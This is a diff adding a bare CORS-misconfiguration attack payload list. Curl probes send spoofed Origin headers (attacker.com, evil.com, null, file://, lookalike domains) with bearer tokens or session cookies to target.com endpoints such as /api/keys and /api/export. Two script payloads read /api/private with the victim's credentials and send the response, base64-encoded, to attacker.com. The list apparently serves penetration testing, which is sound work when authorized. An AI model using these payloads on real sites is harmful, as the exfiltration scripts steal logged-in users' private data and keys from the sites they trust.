@@ -1,0 +1,23 @@
+curl -s https://target.com/api/user -H "Origin: https://attacker.com" -H "Authorization: Bearer {token}" -I
+curl -s https://target.com/api/user -H "Origin: null" -H "Authorization: Bearer {token}" -I
+curl -s https://target.com/api/user -H "Origin: https://target.com.attacker.com" -H "Authorization: Bearer {token}" -I
+curl -s https://target.com/api/user -H "Origin: https://attackertarget.com" -H "Authorization: Bearer {token}" -I
+curl -s https://target.com/api/user -H "Origin: https://target.com.evil.com" -H "Authorization: Bearer {token}" -I
+curl -s https://target.com/api/user -H "Origin: https://sub.target.com.attacker.com" -H "Authorization: Bearer {token}" -I
+curl -s https://target.com/api/user -H "Origin: https://notarget.com" -H "Authorization: Bearer {token}" -I
+curl -s https://target.com/api/private -H "Origin: https://attacker.com" --cookie "session={valid_session}" -I
+curl -s -X OPTIONS https://target.com/api/user -H "Origin: https://attacker.com" -H "Access-Control-Request-Method: GET" -I
+curl -s -X OPTIONS https://target.com/api/user -H "Origin: https://attacker.com" -H "Access-Control-Request-Method: PUT" -H "Access-Control-Request-Headers: Authorization" -I
+<script>fetch('https://target.com/api/private',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))</script>
+<script>var x=new XMLHttpRequest();x.open('GET','https://target.com/api/user',true);x.withCredentials=true;x.onload=function(){fetch('https://attacker.com/?d='+btoa(x.responseText))};x.send()</script>
+Origin: https://target.com.attacker.com
+Origin: https://evil-target.com
+Origin: http://target.com (try HTTP if HTTPS)
+Origin: https://sub.target.com (check wildcard subdomain)
+Origin: https://target.com.attacker.com
+Origin: null
+Origin: file://
+Origin: https://target.com\attacker.com
+Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true (misconfiguration to check for)
+curl -s https://target.com/api/keys -H "Origin: https://attacker.com" -H "Authorization: Bearer {token}"
+curl -s https://target.com/api/export -H "Origin: https://attacker.com" -H "Cookie: session={session}"
